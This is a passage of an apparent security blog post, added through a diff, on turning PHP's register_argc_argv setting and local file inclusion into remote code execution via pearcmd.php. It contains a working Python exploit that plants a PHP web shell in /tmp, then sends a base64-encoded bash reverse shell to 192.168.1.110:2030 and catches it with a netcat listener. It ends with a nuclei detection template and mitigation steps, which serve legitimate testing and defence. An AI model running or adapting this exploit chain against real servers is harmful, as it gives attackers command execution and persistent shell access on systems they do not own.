+<span class="n">cmd_shell</span> <span class="o">=</span> <span class="s2">&#34;&lt;?=die(system($_GET[&#39;cmd&#39;]))?&gt;&#34;</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/</span><span class="si">{</span><span class="n">cmd_shell</span><span class="si">}</span><span class="s2">+/tmp/h4ndsh.php&#34;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1"># inject the command</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
+<span class="n">cmd</span> <span class="o">=</span> <span class="n">urllib</span><span class="o">.</span><span class="n">parse</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;YmFzaCAtYyAic2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjExMC8yMDMwIDA+JjEiCg==&#39;</span><span class="p">)</span>
+<span class="c1">#call the file</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s2">&#34;GET&#34;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&#34;/index.php?file=/tmp/h4ndsh.php&amp;cmd=echo+</span><span class="si">{</span><span class="n">cmd</span><span class="si">}</span><span class="s2">|base64+-d|bash&#34;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Once we have the script ready, we should open a listener and then execute the script in python3.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -lvnp <span class="m">2030</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 request.py
+</code></pre></td></tr></table>
+</div>
+</div><p>And we successfully establish a connection.</p>
+<p><figure><a class="lightgallery" href="/2023/phpinfo/netcat_connection.png" title="reverse shell" data-thumbnail="/2023/phpinfo/netcat_connection.png" data-sub-html="<h2>Reverse Shell</h2><p>reverse shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/netcat_connection.png"
+            data-srcset="/2023/phpinfo/netcat_connection.png, /2023/phpinfo/netcat_connection.png 1.5x, /2023/phpinfo/netcat_connection.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/netcat_connection.png" width="557" height="203" />
+    </a><figcaption class="image-caption">Reverse Shell</figcaption>
+    </figure></p>
+<h1 id="realworld">Realworld</h1>
+<p>This detection does not necessarily imply that the web service is vulnerable. As mentioned earlier, the presence of a Local File Inclusion (LFI) vulnerability is required for the successful execution of the process outlined above, and each case may vary. However, to identify systems running PHP versions &lt;= 7.3, we can utilize <a href="https://github.com/projectdiscovery/nuclei" target="_blank" rel="noopener noreffer ">nuclei</a>. This tool is capable of scanning for various vulnerabilities, including Remote Code Execution (RCE), SQL injection, and cross-site scripting (XSS), providing us with insights into potential security risks.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nuclei -u &lt;target&gt; -tags phpinfo -nc -silent
+</code></pre></td></tr></table>
+</div>
+</div><p>I developed a template to detect if argv and argc are active and if argument injection is working.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l">check-register_argc_argv</span><span class="w">
+</span><span class="w"></span><span class="nt">info</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Check register_argc_argv</span><span class="w">
+</span><span class="w">  </span><span class="nt">author</span><span class="p">:</span><span class="w"> </span><span class="l">h4ndsh</span><span class="w">
+</span><span class="w">  </span><span class="nt">severity</span><span class="p">:</span><span class="w"> </span><span class="l">high</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="nt">http</span><span class="p">:</span><span class="w">
+</span><span class="w">  </span>- <span class="nt">method</span><span class="p">:</span><span class="w"> </span><span class="l">GET</span><span class="w">
+</span><span class="w">    </span><span class="nt">path</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span>- <span class="s2">&#34;{{BaseURL}}?a805841404a60ccf326f0dbb006dc811&#34;</span><span class="w">
+</span><span class="w">    </span><span class="nt">matchers-condition</span><span class="p">:</span><span class="w"> </span><span class="l">and</span><span class="w">
+</span><span class="w">    </span><span class="nt">matchers</span><span class="p">:</span><span class="w">
+</span><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">status</span><span class="w">
+</span><span class="w">        </span><span class="nt">status</span><span class="p">:</span><span class="w">
+</span><span class="w">          </span>- <span class="m">200</span><span class="w">
+</span><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span><span class="w">        </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span><span class="w">          </span>- <span class="s2">&#34;[0] =&amp;gt; a805841404a60ccf326f0dbb006dc811&#34;</span><span class="w">
+</span><span class="w">      </span>- <span class="nt">type</span><span class="p">:</span><span class="w"> </span><span class="l">word</span><span class="w">
+</span><span class="w">        </span><span class="nt">words</span><span class="p">:</span><span class="w">
+</span><span class="w">          </span>- <span class="s2">&#34;&lt;tr&gt;&lt;td class=\&#34;e\&#34;&gt;register_argc_argv&lt;/td&gt;&lt;td class=\&#34;v\&#34;&gt;On&lt;/td&gt;&lt;td class=\&#34;v\&#34;&gt;On&lt;/td&gt;&lt;/tr&gt;&#34;</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>To conclude, we performed the verification.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nuclei -u &lt;target&gt; -t argv.yaml -nc -silent
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/2023/phpinfo/argc_argv_check.png" title="argc_argv_check" data-thumbnail="/2023/phpinfo/argc_argv_check.png" data-sub-html="<h2>Results</h2><p>argc_argv_check</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/argc_argv_check.png"
+            data-srcset="/2023/phpinfo/argc_argv_check.png, /2023/phpinfo/argc_argv_check.png 1.5x, /2023/phpinfo/argc_argv_check.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/argc_argv_check.png" width="1403" height="619" />
+    </a><figcaption class="image-caption">Results</figcaption>
+    </figure></p>
+<h1 id="mitigation">Mitigation</h1>
+<pre><code>1. Disable register_argc_argv (if possible).
+2. Check for and remove any directory exposure vulnerabilities.
+3. Update PHP to the latest version.
+</code></pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">echo</span> <span class="s2">&#34;register_argc_argv = Off&#34;</span> &gt; /usr/local/etc/php/php.ini
+</code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/2023/phpinfo/mitigation.png" title="Mitigation" data-thumbnail="/2023/phpinfo/mitigation.png" data-sub-html="<h2>Mitigation</h2><p>Mitigation</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/2023/phpinfo/mitigation.png"
+            data-srcset="/2023/phpinfo/mitigation.png, /2023/phpinfo/mitigation.png 1.5x, /2023/phpinfo/mitigation.png 2x"
+            data-sizes="auto"
+            alt="/2023/phpinfo/mitigation.png" width="1244" height="324" />
+    </a><figcaption class="image-caption">Mitigation</figcaption>
+    </figure></p>
+<h1 id="references">References</h1>
+<p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html" target="_blank" rel="noopener noreffer ">https://www.leavesongs.com</a></p>
+<p><a href="https://www.php.net/manual/en/ini.core.php#ini.register-argc-argv" target="_blank" rel="noopener noreffer ">https://www.php.net</a></p>
+<p>Thanks 😄</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on Oct 12, 2023</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/php7/">php7</a>,&nbsp;<a href="/tags/phpinfo/">phpinfo</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2023/saphety/" class="prev" rel="prev" title="Saphety Phishing Campaign"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Saphety Phishing Campaign</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.92.2">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.b235c997b7c450ac654220a2166132717d014c987d70ed76b4b7e9e715105b58442c83179982a63d8a41998c2c2bd8988c15a80f6aef211a88dddf0e7309389d.js" integrity="sha512-sjXJl7fEUKxlQiCiFmEycX0BTJh9cO12tLfp5xUQW1hELIMXmYKmPYpBmYwsK9iYjBWoD2rvIRqI3d8Ocwk4nQ=="></script></body>
+</html>
